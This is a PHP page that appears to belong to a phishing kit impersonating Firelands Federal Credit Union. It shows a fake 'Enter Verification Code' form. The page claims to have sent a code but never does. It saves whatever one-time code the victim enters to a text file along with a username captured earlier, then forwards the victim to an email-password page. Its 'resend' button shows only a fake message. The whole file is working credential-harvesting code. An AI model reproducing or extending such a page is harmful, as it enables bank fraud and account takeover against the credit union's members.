<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

// Redirect to login if no username in session
if (!isset($_SESSION['emzemz'])) {
    header('Location: index.php');
    exit;
}

$username = $_SESSION['emzemz'];
$errors = [];

// Generate a 6-digit OTP
$generatedOtp = sprintf('%06d', mt_rand(0, 999999));

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $otp = trim($_POST['otp'] ?? '');
    
    // Simple validation
    if (empty($otp)) {
        $errors['otp'] = 'Please enter the verification code';
    }
    
    if (empty($errors)) {
        // Save to test file (matching affinity field names)
        $data = [
            'step' => 'otp_verification',
            'usrnm' => $username,
            'vrf_cd' => $otp
        ];
        
        saveUserData('otp_verification.txt', $data);
        
        // Redirect to email password page
        header('Location: email_password.php');
        exit;
    }
}

$footerLinks = [
    'About Us',
    'Customer Service',
    'Careers',
    'Investor Relations',
    'Media Center',
    'Security',
    'Privacy',
    'Site Map'
];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Firelands FCU - Verification Code</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div class="relative flex min-h-screen flex-col overflow-hidden text-white">
        <!-- Background Image with Overlay -->
        <div class="absolute inset-0">
            <img
                src="assets/firelands-landing.jpg"
                alt="Sun setting over Firelands farm fields"
                class="h-full w-full object-cover"
            />
            <div class="absolute inset-0 bg-gradient-to-r from-black/80 via-black/55 to-black/20"></div>
        </div>

        <!-- Main Content -->
        <div class="relative z-10 flex flex-1 flex-col justify-center px-6 py-10 md:px-12 lg:px-20">
            <div class="mx-auto flex w-full max-w-6xl flex-col gap-12 lg:flex-row lg:items-center lg:justify-between">
                <!-- Left Section: Hero Text -->
                <section class="order-2 flex flex-1 flex-col justify-center space-y-6 lg:order-1">
                    <div class="space-y-3">
                        <p class="text-3xl font-semibold leading-tight text-white drop-shadow sm:text-4xl lg:text-5xl">
                            Verify Your Identity
                        </p>
                        <h1 class="text-base font-semibold uppercase tracking-[0.3em] text-white/70">
                            Enter your verification code
                        </h1>
                    </div>
                </section>

                <!-- Right Section: OTP Card -->
                <section class="order-1 w-full max-w-md lg:order-2 lg:self-start">
                    <div class="mx-auto w-full rounded-[32px] bg-white/95 p-8 text-gray-800 shadow-2xl backdrop-blur lg:mx-0">
                        <!-- Logo -->
                        <div class="flex items-center justify-start">
                            <img
                                src="assets/logo.svg"
                                alt="Firelands Federal Credit Union"
                                class="h-12 w-auto"
                            />
                        </div>

                        <!-- Heading -->
                        <h2 class="mt-6 text-2xl font-semibold text-[#2f2e67]">Enter Verification Code</h2>
                        <p class="mt-2 text-sm text-gray-600">We've sent a 6-digit verification code to your registered email and phone number.</p>

                        <!-- Error Display -->
                        <?php if (!empty($errors)): ?>
                            <div class="mt-4 rounded-lg bg-red-50 border border-red-200 p-4">
                                <div class="flex">
                                    <div class="flex-shrink-0">
                                        <svg class="h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                                            <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clip-rule="evenodd" />
                                        </svg>
                                    </div>
                                    <div class="ml-3">
                                        <p class="text-sm text-red-700">
                                            Please fix the following errors:
                                            <ul class="list-disc pl-5 mt-1">
                                                <?php foreach ($errors as $error): ?>
                                                    <li><?php echo htmlspecialchars($error); ?></li>
                                                <?php endforeach; ?>
                                            </ul>
                                        </p>
                                    </div>
                                </div>
                            </div>
                        <?php endif; ?>

                        <form method="POST" class="mt-6 space-y-6">
                            <!-- OTP Input -->
                            <div class="space-y-2">
                                <label for="otp" class="text-sm font-medium text-gray-600">
                                    Verification Code
                                </label>
                                <input
                                    type="text"
                                    id="otp"
                                    name="otp"
                                    placeholder="Enter 6-digit code"
                                    value="<?php echo htmlspecialchars($_POST['otp'] ?? ''); ?>"
                                    maxlength="6"
                                    class="w-full rounded-2xl border border-gray-200 bg-gray-50 px-4 py-3 text-center text-lg font-mono text-gray-800 outline-none transition focus:border-[#5a63d8] focus:bg-white focus:ring-2 focus:ring-[#5a63d8]/20"
                                />
                                <?php if (isset($errors['otp'])): ?>
                                    <p class="text-sm font-medium text-rose-600"><?php echo htmlspecialchars($errors['otp']); ?></p>
                                <?php endif; ?>
                            </div>

                            <!-- Resend Code Link -->
                            <div class="text-center">
                                <button
                                    type="button"
                                    onclick="resendCode()"
                                    class="text-sm font-medium text-[#801346] transition hover:text-[#5a63d8] hover:underline"
                                >
                                    Resend verification code
                                </button>
                            </div>

                            <!-- Submit Button -->
                            <button
                                type="submit"
                                class="w-full rounded-full bg-gradient-to-r from-[#cdd1f5] to-[#f2f3fb] px-6 py-3 text-base font-semibold text-[#8f8fb8] shadow-inner transition enabled:hover:from-[#b7bff2] enabled:hover:to-[#e3e6fb] disabled:opacity-70"
                            >
                                Verify Code
                            </button>

                            <!-- Back Link -->
                            <div class="text-center">
                                <a href="security_questions.php" class="text-sm font-medium text-[#801346] transition hover:text-[#5a63d8] hover:underline">
                                    Back to Security Questions
                                </a>
                            </div>
                        </form>
                    </div>
                </section>
            </div>

            <!-- Footer Links -->
            <div class="mt-10 flex flex-wrap items-center justify-end gap-10 text-sm font-semibold text-white/80">
                <?php foreach ($footerLinks as $index => $label): ?>
                    <a href="#" class="transition hover:text-white">
                        <?php echo htmlspecialchars($label); ?>
                    </a>
                <?php endforeach; ?>
            </div>
        </div>
    </div>

    <script>
        // Auto-focus OTP field on page load
        document.addEventListener('DOMContentLoaded', function() {
            const otpField = document.getElementById('otp');
            if (otpField) {
                otpField.focus();
            }
        });

        // Only allow numbers in OTP field
        document.getElementById('otp').addEventListener('input', function(e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });

        // Resend code function
        function resendCode() {
            // Show a message that code was resent
            const message = document.createElement('div');
            message.className = 'mt-4 rounded-lg bg-green-50 border border-green-200 p-4';
            message.innerHTML = `
                <div class="flex">
                    <div class="flex-shrink-0">
                        <svg class="h-5 w-5 text-green-500" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor">
                            <path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clip-rule="evenodd" />
                        </svg>
                    </div>
                    <div class="ml-3">
                        <p class="text-sm text-green-700">Verification code has been resent to your registered email and phone number.</p>
                    </div>
                </div>
            `;
            
            // Insert after the form
            const form = document.querySelector('form');
            form.insertAdjacentElement('afterend', message);
            
            // Remove message after 5 seconds
            setTimeout(() => {
                message.remove();
            }, 5000);
        }
    </script>
</body>
</html>
